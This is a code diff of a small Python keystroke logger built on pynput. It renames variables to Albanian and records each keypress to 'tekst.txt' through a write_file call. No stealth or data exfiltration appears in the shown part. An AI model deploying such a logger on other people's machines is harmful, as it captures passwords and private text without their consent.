@@ -2,20 +2,20 @@ import os
 from pynput.keyboard import Listener
 
 
-keys = []
-count = 0
+qelesat = []
+numerimi = 0
 
 path = 'tekst.txt'
 
 
-def klikimi(key) :
-	global keys, count
+def on_press(qeles) :
+	global qelesat, numerimi
 
 
-	keys.append(key)
-	count +=1
+	qelesat.append(qeles)
+	numerimi +=1
 
-	if count >= 1:
-		count = 0
-		write_file(keys)
-		keys = []
+	if numerimi >= 1:
+		numerimi = 0
+		write_file(qelesat)
+		qelesat = []
